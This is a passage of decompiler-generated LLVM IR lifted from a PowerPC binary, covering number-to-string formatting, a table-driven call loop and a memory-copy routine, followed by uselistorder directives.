  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_1001124c, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_1001124c, -1
  br i1 %tmp80, label %dec_label_pc_10011268, label %dec_label_pc_10011260

dec_label_pc_10011260:                            ; preds = %dec_label_pc_1001124c
  %v1_10011260 = sub i32 0, %v0_1001124c
  store i32 %v1_10011260, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10011268

dec_label_pc_10011268:                            ; preds = %dec_label_pc_1001124c, %dec_label_pc_10011260
  %v0_1001127c31 = phi i32 [ %v0_1001124c, %dec_label_pc_1001124c ], [ %v1_10011260, %dec_label_pc_10011260 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001126c = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_1001126c, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1001127c

dec_label_pc_1001127c:                            ; preds = %dec_label_pc_1001127c.backedge, %dec_label_pc_10011268
  %v2_1001129c = phi i32 [ %v3_1001129c, %dec_label_pc_1001127c.backedge ], [ %v2_1001126c, %dec_label_pc_10011268 ]
  %v0_10011280 = phi i32 [ %v0_10011280.pre, %dec_label_pc_1001127c.backedge ], [ 2, %dec_label_pc_10011268 ]
  %v1_1001127c = phi i32 [ %v1_1001127c.pre, %dec_label_pc_1001127c.backedge ], [ 10, %dec_label_pc_10011268 ]
  %v1_10011290 = phi i32 [ %v0_1001127c.pre, %dec_label_pc_1001127c.backedge ], [ %v0_1001127c31, %dec_label_pc_10011268 ]
  %v2_1001127c = sdiv i32 %v1_10011290, %v1_1001127c
  store i32 %v2_1001127c, i32* %r0.global-to-local, align 4
  %v1_10011280 = add i32 %v0_10011280, 1
  store i32 %v1_10011280, i32* @r7, align 4
  %v1_10011284 = icmp slt i32 %v1_10011280, 3
  %v3_10011284 = icmp eq i32 %v1_10011280, 3
  store i1 %v1_10011284, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011284, i1* %cr7_eq.global-to-local, align 1
  %v1_1001128c = icmp slt i32 %v2_1001127c, 0
  %v2_1001128c = icmp sgt i32 %v2_1001127c, 0
  %v3_1001128c = icmp eq i32 %v2_1001127c, 0
  store i1 %v1_1001128c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1001128c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1001128c, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_1001127c, -10
  store i32 %v2_1001127c, i32* %r11.global-to-local, align 4
  %v2_10011290 = add i32 %v1_10011290, 48
  %v1_10011298 = add i32 %v2_10011290, %tmp81
  store i32 %v1_10011298, i32* %r9.global-to-local, align 4
  %v1_1001129c = trunc i32 %v1_10011298 to i8
  %v3_1001129c = add i32 %v2_1001129c, -1
  %v4_1001129c = inttoptr i32 %v3_1001129c to i8*
  store i8 %v1_1001129c, i8* %v4_1001129c, align 1
  store i32 %v3_1001129c, i32* %r10.global-to-local, align 4
  %v0_100112a0 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_100112a0 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_100112a0 = or i1 %v0_100112a0, %v1_100112a0
  br i1 %v2_100112a0, label %dec_label_pc_1001127c.backedge, label %dec_label_pc_100112a4

dec_label_pc_1001127c.backedge:                   ; preds = %dec_label_pc_1001127c, %dec_label_pc_100112a4
  %v0_1001127c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1001127c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_10011280.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1001127c

dec_label_pc_100112a4:                            ; preds = %dec_label_pc_1001127c
  %v0_100112a4 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_100112a4, label %dec_label_pc_100112a8, label %dec_label_pc_1001127c.backedge

dec_label_pc_100112a8:                            ; preds = %dec_label_pc_100112a4
  %v1_100112a8 = add i32 %v2_1001129c, -2
  store i32 %v1_100112a8, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_100112b0 = add i32 %v2_1001129c, -3
  store i32 %v1_100112b0, i32* %r11.global-to-local, align 4
  %v0_100112b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100112b4 = trunc i32 %v0_100112b4 to i8
  %v4_100112b4 = inttoptr i32 %v1_100112a8 to i8*
  store i8 %v1_100112b4, i8* %v4_100112b4, align 1
  %v0_100112b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_100112b8 = trunc i32 %v0_100112b8 to i8
  %v2_100112b8 = load i32, i32* %r9.global-to-local, align 4
  %v3_100112b8 = add i32 %v2_100112b8, -1
  %v4_100112b8 = inttoptr i32 %v3_100112b8 to i8*
  store i8 %v1_100112b8, i8* %v4_100112b8, align 1
  %v0_100112bc = load i32, i32* %r0.global-to-local, align 4
  %v1_100112bc = load i32, i32* @r8, align 4
  %v2_100112bc = inttoptr i32 %v1_100112bc to i32*
  store i32 %v0_100112bc, i32* %v2_100112bc, align 4
  %v0_100112c0 = load i32, i32* @r7, align 4
  %v1_100112c0 = load i32, i32* @r8, align 4
  %v2_100112c0 = add i32 %v1_100112c0, 4
  %v3_100112c0 = inttoptr i32 %v2_100112c0 to i32*
  store i32 %v0_100112c0, i32* %v3_100112c0, align 4
  %v0_100112c4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100112c4 = load i32, i32* @r8, align 4
  %v2_100112c4 = add i32 %v1_100112c4, 8
  %v3_100112c4 = inttoptr i32 %v2_100112c4 to i32*
  store i32 %v0_100112c4, i32* %v3_100112c4, align 4
  %v0_100112c8 = load i32, i32* @r8, align 4
  %v1_100112c8 = add i32 %v0_100112c8, 12
  store i32 %v1_100112c8, i32* @r8, align 4
  br label %dec_label_pc_100112cc

dec_label_pc_100112cc:                            ; preds = %dec_label_pc_10011244, %dec_label_pc_10010e20, %dec_label_pc_100112a8
  %v0_10011348 = phi i32 [ %v1_100112d837, %dec_label_pc_10011244 ], [ %v2_10010e2c, %dec_label_pc_10010e20 ], [ %v1_100112c8, %dec_label_pc_100112a8 ]
  %v2_100112cc = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_100112cc, i32* %r9.global-to-local, align 4
  %v1_100112dc.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100112d0

dec_label_pc_100112d0:                            ; preds = %dec_label_pc_100112d0, %dec_label_pc_100112cc
  %v1_100112dc = phi i32 [ %v2_100112dc, %dec_label_pc_100112d0 ], [ %v1_100112dc.pre, %dec_label_pc_100112cc ]
  %v0_100112d0 = phi i32 [ %v1_100112d4, %dec_label_pc_100112d0 ], [ %v2_100112cc, %dec_label_pc_100112cc ]
  %v1_100112d0 = inttoptr i32 %v0_100112d0 to i32*
  %v2_100112d0 = load i32, i32* %v1_100112d0, align 4
  store i32 %v2_100112d0, i32* %r0.global-to-local, align 4
  %v1_100112d4 = add i32 %v0_100112d0, 12
  store i32 %v1_100112d4, i32* %r9.global-to-local, align 4
  %v2_100112d8 = icmp ult i32 %v1_100112d4, %v0_10011348
  %v2_100112dc = sub i32 %v1_100112dc, %v2_100112d0
  store i32 %v2_100112dc, i32* @r28, align 4
  br i1 %v2_100112d8, label %dec_label_pc_100112d0, label %dec_label_pc_100112e4

dec_label_pc_100112e4:                            ; preds = %dec_label_pc_100112d0
  %v4_100112d8 = icmp eq i32 %v1_100112d4, %v0_10011348
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100112d8, i1* %cr7_eq.global-to-local, align 1
  %v3_100112e4 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_10011348, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_100112e4, 0
  %v1_100112f8 = zext i1 %tmp85 to i32
  store i32 %v1_100112f8, i32* %r9.global-to-local, align 4
  %v2_100112fc = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_100112fc, i32* %r0.global-to-local, align 4
  %v2_10011300 = sub i32 %v2_100112dc, %v1_100112f8
  store i32 %v2_10011300, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_10011300, 1
  br i1 %tmp82, label %dec_label_pc_1001136c, label %dec_label_pc_10011310

dec_label_pc_10011310:                            ; preds = %dec_label_pc_100112e4
  %v3_10011310 = load i32, i32* %v2_10010d4c, align 4
  store i32 %v3_10011310, i32* %r0.global-to-local, align 4
  %v1_10011314 = and i32 %v3_10011310, 8
  store i32 %v1_10011314, i32* @r7, align 4
  %v3_10011314 = icmp eq i32 %v1_10011314, 0
  br i1 %v3_10011314, label %dec_label_pc_10011338, label %dec_label_pc_1001131c

dec_label_pc_1001131c:                            ; preds = %dec_label_pc_10011310
  %v1_10011320 = add i32 %v0_10011348, 12
  store i32 %v1_10011320, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1001a493.799 to i32), i32* %r9.global-to-local, align 4
  %v2_10011328 = inttoptr i32 %v0_10011348 to i32*
  store i32 160, i32* %v2_10011328, align 4
  %v0_1001132c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001132c = load i32, i32* @r8, align 4
  %v2_1001132c = add i32 %v1_1001132c, 4
  %v3_1001132c = inttoptr i32 %v2_1001132c to i32*
  store i32 %v0_1001132c, i32* %v3_1001132c, align 4
  %v0_10011330 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011330 = load i32, i32* @r8, align 4
  %v2_10011330 = add i32 %v1_10011330, 8
  %v3_10011330 = inttoptr i32 %v2_10011330 to i32*
  store i32 %v0_10011330, i32* %v3_10011330, align 4
  br label %dec_label_pc_1001136c

dec_label_pc_10011338:                            ; preds = %dec_label_pc_10011310
  %v1_10011338 = add i32 %tmp, 16
  %v2_10011338 = inttoptr i32 %v1_10011338 to i32*
  %v3_10011338 = load i32, i32* %v2_10011338, align 4
  store i32 %v3_10011338, i32* %r0.global-to-local, align 4
  %v1_1001133c = icmp slt i32 %v3_10011338, 48
  %v3_1001133c = icmp eq i32 %v3_10011338, 48
  store i1 %v1_1001133c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001133c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001133c, label %dec_label_pc_10011344, label %dec_label_pc_10011360

dec_label_pc_10011344:                            ; preds = %dec_label_pc_10011338
  %v3_10011344 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_10011348, i32* @r30, align 4
  %v2_1001134c = add i32 %v3_10011344, %v2_10011300
  store i32 %v2_1001134c, i32* %r0.global-to-local, align 4
  store i32 %v2_1001134c, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1001136c

dec_label_pc_10011358:                            ; preds = %dec_label_pc_10011374
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_100113a8

dec_label_pc_10011360:                            ; preds = %dec_label_pc_10011338
  store i32 %v2_100112dc, i32* %r0.global-to-local, align 4
  store i32 %v0_10011348, i32* @r30, align 4
  br label %dec_label_pc_1001136c

dec_label_pc_1001136c:                            ; preds = %dec_label_pc_100112e4, %dec_label_pc_10011344, %dec_label_pc_1001131c, %dec_label_pc_10011360
  store i32 0, i32* @r29, align 4
  %v2_10011370 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_10011370, i32* @r31, align 4
  br label %dec_label_pc_10011374

dec_label_pc_10011374:                            ; preds = %dec_label_pc_100113a4, %dec_label_pc_1001136c
  %v0_10011384 = phi i32 [ %v1_10011390, %dec_label_pc_100113a4 ], [ %v2_10011370, %dec_label_pc_1001136c ]
  %v1_10011374 = inttoptr i32 %v0_10011384 to i32*
  %v2_10011374 = load i32, i32* %v1_10011374, align 4
  store i32 %v2_10011374, i32* %r4.global-to-local, align 4
  %v0_10011378 = load i32, i32* @r27, align 4
  store i32 %v0_10011378, i32* %r3.global-to-local, align 4
  %v1_1001137c = add i32 %v0_10011384, 4
  %v2_1001137c = inttoptr i32 %v1_1001137c to i32*
  %v3_1001137c = load i32, i32* %v2_1001137c, align 4
  store i32 %v3_1001137c, i32* %r5.global-to-local, align 4
  %v0_10011380 = load i32, i32* @r26, align 4
  store i32 %v0_10011380, i32* %ctr.global-to-local, align 4
  %v1_10011384 = add i32 %v0_10011384, 8
  %v2_10011384 = inttoptr i32 %v1_10011384 to i32*
  %v3_10011384 = load i32, i32* %v2_10011384, align 4
  store i32 %v3_10011384, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10011380)
  %v0_1001138c = load i32, i32* @r31, align 4
  %v1_1001138c = add i32 %v0_1001138c, 4
  %v2_1001138c = inttoptr i32 %v1_1001138c to i32*
  %v3_1001138c = load i32, i32* %v2_1001138c, align 4
  store i32 %v3_1001138c, i32* %r0.global-to-local, align 4
  %v1_10011390 = add i32 %v0_1001138c, 12
  store i32 %v1_10011390, i32* @r31, align 4
  %v0_10011394 = load i32, i32* @r29, align 4
  %v1_10011394 = load i32, i32* %r3.global-to-local, align 4
  %v2_10011394 = add i32 %v1_10011394, %v0_10011394
  store i32 %v2_10011394, i32* @r29, align 4
  %v1_10011398 = load i32, i32* @r30, align 4
  %v2_10011398 = icmp ult i32 %v1_10011390, %v1_10011398
  %v3_10011398 = icmp ugt i32 %v1_10011390, %v1_10011398
  %v4_10011398 = icmp eq i32 %v1_10011390, %v1_10011398
  store i1 %v2_10011398, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10011398, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10011398, i1* %cr6_eq.global-to-local, align 1
  %v2_1001139c = icmp slt i32 %v1_10011394, %v3_1001138c
  %v4_1001139c = icmp eq i32 %v1_10011394, %v3_1001138c
  store i1 %v2_1001139c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001139c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1001139c, label %dec_label_pc_100113a4, label %dec_label_pc_10011358

dec_label_pc_100113a4:                            ; preds = %dec_label_pc_10011374
  br i1 %v2_10011398, label %dec_label_pc_10011374, label %dec_label_pc_100113a8

dec_label_pc_100113a8:                            ; preds = %dec_label_pc_100113a4, %dec_label_pc_10011358
  %v0_100113ac = phi i32 [ -1, %dec_label_pc_10011358 ], [ %v2_10011394, %dec_label_pc_100113a4 ]
  store i32 %v0_10010d00, i32* %r0.global-to-local, align 4
  store i32 %v0_100113ac, i32* %r3.global-to-local, align 4
  ret i32 %v0_100113ac

; uselistorder directives
  uselistorder i32 %v0_100113ac, { 1, 0 }
  uselistorder i32 %v1_10011394, { 2, 1, 0 }
  uselistorder i32 %v1_10011390, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v3_1001138c, { 1, 0, 2 }
  uselistorder i32 %v0_10011384, { 0, 2, 1 }
  uselistorder i32 %v3_10011338, { 1, 0, 2 }
  uselistorder i32 %v1_100112f8, { 1, 0 }
  uselistorder i32 %v2_100112dc, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100112d4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_100112d0, { 1, 0 }
  uselistorder i32 %v0_10011348, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_1001129c, { 1, 2, 0 }
  uselistorder i32 %v1_10011280, { 1, 0, 2 }
  uselistorder i32 %v2_1001127c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_1001124c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_1001121c, { 2, 0, 1 }
  uselistorder i32 %v2_10011218, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10011188, { 1, 0 }
  uselistorder i32 %v2_100110f0, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_100110c0, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10011088, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10011080, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_1001104c, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_1001103c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_10011030, { 1, 0, 2 }
  uselistorder i32 %v1_10011014, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10010fcc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10010fbc, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10010fa0, { 1, 0 }
  uselistorder i32 %v1_10010f7c, { 1, 0 }
  uselistorder i32 %v2_10010f5c, { 1, 0, 2 }
  uselistorder i32 %v0_10010f04, { 1, 0 }
  uselistorder i32 %v1_10010d68, { 1, 0 }
  uselistorder i32 %v0_10010df8, { 2, 1, 0 }
  uselistorder i32 %v1_10010d3c, { 1, 0 }
  uselistorder i32 %v1_10010d24, { 1, 0, 2 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 1, 4, 3, 2, 0, 5, 6 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 21, 22, 19, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 9, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 9, 10, 11, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 3, 4, 0, 5, 1, 6, 7, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 15, 16, 19, 17, 20, 18, 21, 22, 23, 24 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 5, 2, 1, 4 }
  uselistorder i32 45, { 2, 1, 0 }
  uselistorder i32 112, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 176, { 2, 3, 0, 4, 1 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 57, { 1, 2, 3, 0 }
  uselistorder i32 102, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1001a490.797 to i32), { 2, 0, 1 }
  uselistorder i32 96, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 43, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001136c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100112cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001127c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10011268, { 1, 0 }
  uselistorder label %dec_label_pc_10011244, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011218, { 1, 0 }
  uselistorder label %dec_label_pc_10011204, { 1, 0 }
  uselistorder label %dec_label_pc_100111e8, { 1, 0 }
  uselistorder label %dec_label_pc_100111c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100111a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001117c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10011160, { 1, 0 }
  uselistorder label %dec_label_pc_100110d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001106c, { 1, 0 }
  uselistorder label %dec_label_pc_1001102c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010ff0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010fc4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10010fa4, { 1, 0 }
  uselistorder label %dec_label_pc_10010f30, { 1, 0 }
  uselistorder label %dec_label_pc_10010e20, { 1, 0 }
  uselistorder label %dec_label_pc_10010d78, { 1, 0 }
  uselistorder label %dec_label_pc_10010d4c, { 1, 0 }
  uselistorder label %dec_label_pc_10010d40, { 1, 0 }
}

define i32 @function_100113c0() local_unnamed_addr {
dec_label_pc_100113c0:
  %stack_var_-40 = alloca i32, align 4
  %v0_100113cc = load i32, i32* @r3, align 4
  %v0_100113d4 = load i32, i32* @r4, align 4
  store i32 %v0_100113d4, i32* @r29, align 4
  store i32 %v0_100113cc, i32* @r31, align 4
  %v0_100113e0 = load i32, i32* @r5, align 4
  store i32 %v0_100113e0, i32* @r27, align 4
  %v1_100113e8 = add i32 %v0_100113cc, 52
  %v2_100113e8 = inttoptr i32 %v1_100113e8 to i32*
  %v3_100113e8 = load i32, i32* %v2_100113e8, align 4
  store i32 %v3_100113e8, i32* @r28, align 4
  %v2_100113f0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100113f0, i32* @r3, align 4
  %v3_100113f4 = icmp eq i32 %v3_100113e8, 0
  br i1 %v3_100113f4, label %dec_label_pc_100113fc, label %dec_label_pc_10011408

dec_label_pc_100113fc:                            ; preds = %dec_label_pc_100113c0
  %v0_100113fc = call i32 @function_10010048()
  %v0_10011404 = call i32 @function_10010040()
  %v0_10011408.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011408

dec_label_pc_10011408:                            ; preds = %dec_label_pc_100113c0, %dec_label_pc_100113fc
  %v0_10011408 = phi i32 [ %v0_100113cc, %dec_label_pc_100113c0 ], [ %v0_10011408.pre, %dec_label_pc_100113fc ]
  %v1_10011408 = inttoptr i32 %v0_10011408 to i16*
  %v2_10011408 = load i16, i16* %v1_10011408, align 2
  %v3_10011408 = zext i16 %v2_10011408 to i32
  store i32 128, i32* @r4, align 4
  store i32 %v0_10011408, i32* @r3, align 4
  store i32 -1, i32* @r30, align 4
  %v1_10011418 = call i32 @__asm_rlwinm(i32 %v3_10011408, i32 0, i32 24, i32 25)
  %v3_1001141c = icmp eq i32 %v1_10011418, 192
  br i1 %v3_1001141c, label %dec_label_pc_10011430, label %dec_label_pc_10011424

dec_label_pc_10011424:                            ; preds = %dec_label_pc_10011408
  store i32 268506152, i32* @lr, align 4
  %v0_10011424 = call i32 @function_10010a4c()
  %v3_10011428 = icmp eq i32 %v0_10011424, 0
  br i1 %v3_10011428, label %dec_label_pc_10011430, label %dec_label_pc_10011444

dec_label_pc_10011430:                            ; preds = %dec_label_pc_10011424, %dec_label_pc_10011408
  %v0_10011430 = load i32, i32* @r29, align 4
  store i32 %v0_10011430, i32* @r4, align 4
  %v0_10011434 = load i32, i32* @r27, align 4
  store i32 %v0_10011434, i32* @r5, align 4
  %v0_10011438 = load i32, i32* @r31, align 4
  store i32 %v0_10011438, i32* @r3, align 4
  store i32 268506176, i32* @lr, align 4
  %v0_1001143c = call i32 @function_1000cc54()
  store i32 %v0_1001143c, i32* @r30, align 4
  br label %dec_label_pc_10011444

dec_label_pc_10011444:                            ; preds = %dec_label_pc_10011424, %dec_label_pc_10011430
  %v0_10011444 = load i32, i32* @r28, align 4
  %v3_10011444 = icmp eq i32 %v0_10011444, 0
  store i32 %v2_100113f0, i32* @r3, align 4
  br i1 %v3_10011444, label %dec_label_pc_10011454, label %dec_label_pc_10011458

dec_label_pc_10011454:                            ; preds = %dec_label_pc_10011444
  %v0_10011454 = call i32 @function_10010048()
  br label %dec_label_pc_10011458

dec_label_pc_10011458:                            ; preds = %dec_label_pc_10011444, %dec_label_pc_10011454
  %v0_1001145c = load i32, i32* @r30, align 4
  ret i32 %v0_1001145c

; uselistorder directives
  uselistorder i32 %v0_10011408, { 1, 0 }
  uselistorder i32 %v0_100113cc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10011458, { 1, 0 }
  uselistorder label %dec_label_pc_10011444, { 1, 0 }
  uselistorder label %dec_label_pc_10011408, { 1, 0 }
}

define i32 @function_10011470(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10011470:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_10011470 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_10011478 = load i32, i32* @r5, align 4
  store i32 %v0_10011478, i32* @r11, align 4
  br i1 %v2_10011470, label %dec_label_pc_10011484, label %dec_label_pc_10011480

dec_label_pc_10011480:                            ; preds = %dec_label_pc_10011470
  %v0_10011480 = call i32 @function_1000dcb0()
  %v1_10011484.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10011484

dec_label_pc_10011484:                            ; preds = %dec_label_pc_10011470, %dec_label_pc_10011480
  %v0_10011488 = phi i32 [ %arg1, %dec_label_pc_10011470 ], [ %v0_10011480, %dec_label_pc_10011480 ]
  %v1_10011484 = phi i32 [ %v0_10011478, %dec_label_pc_10011470 ], [ %v1_10011484.pre, %dec_label_pc_10011480 ]
  %v2_10011484 = add i32 %v1_10011484, %arg2
  store i32 %v2_10011484, i32* %r4.global-to-local, align 4
  %v2_10011488 = add i32 %v1_10011484, %v0_10011488
  store i32 %v2_10011488, i32* %r10.global-to-local, align 4
  %v1_1001148c = call i32 @__asm_rlwinm.(i32 %v1_10011484, i32 29, i32 3, i32 31)
  store i32 %v1_1001148c, i32* %r9.global-to-local, align 4
  %v4_1001148c = icmp eq i32 %v1_1001148c, 0
  br i1 %v4_1001148c, label %dec_label_pc_100114b4, label %dec_label_pc_10011494

dec_label_pc_10011494:                            ; preds = %dec_label_pc_10011484
  %v0_10011494 = load i32, i32* %r10.global-to-local, align 4
  %v1_10011494 = urem i32 %v0_10011494, 4
  %v3_10011494 = icmp eq i32 %v1_10011494, 0
  br i1 %v3_10011494, label %dec_label_pc_1001149c, label %dec_label_pc_100114e8

dec_label_pc_1001149c:                            ; preds = %dec_label_pc_10011500.dec_label_pc_1001149c_crit_edge, %dec_label_pc_10011494
  %v1_100114a8.pre = phi i32 [ %v1_100114a8.pre.pre, %dec_label_pc_10011500.dec_label_pc_1001149c_crit_edge ], [ %v0_10011494, %dec_label_pc_10011494 ]
  %v0_1001149c = phi i32 [ %v1_10011500, %dec_label_pc_10011500.dec_label_pc_1001149c_crit_edge ], [ %v1_1001148c, %dec_label_pc_10011494 ]
  store i32 %v0_1001149c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100114a0

dec_label_pc_100114a0:                            ; preds = %dec_label_pc_100114a0, %dec_label_pc_1001149c
  %v1_100114a8 = phi i32 [ %v2_100114ac, %dec_label_pc_100114a0 ], [ %v1_100114a8.pre, %dec_label_pc_1001149c ]
  %v0_100114a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100114a0 = add i32 %v0_100114a0, -4
  %v2_100114a0 = inttoptr i32 %v1_100114a0 to i32*
  %v3_100114a0 = load i32, i32* %v2_100114a0, align 4
  %v1_100114a4 = add i32 %v0_100114a0, -8
  %v2_100114a4 = inttoptr i32 %v1_100114a4 to i32*
  %v3_100114a4 = load i32, i32* %v2_100114a4, align 4
  store i32 %v3_100114a4, i32* %r9.global-to-local, align 4
  store i32 %v1_100114a4, i32* %r4.global-to-local, align 4
  %v2_100114a8 = add i32 %v1_100114a8, -4
  %v3_100114a8 = inttoptr i32 %v2_100114a8 to i32*
  store i32 %v3_100114a0, i32* %v3_100114a8, align 4
  %v0_100114ac = load i32, i32* %r9.global-to-local, align 4
  %v1_100114ac = load i32, i32* %r10.global-to-local, align 4
  %v2_100114ac = add i32 %v1_100114ac, -8
  %v3_100114ac = inttoptr i32 %v2_100114ac to i32*
  store i32 %v0_100114ac, i32* %v3_100114ac, align 4
  store i32 %v2_100114ac, i32* %r10.global-to-local, align 4
  %v0_100114b0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100114b0 = add i32 %v0_100114b0, -1
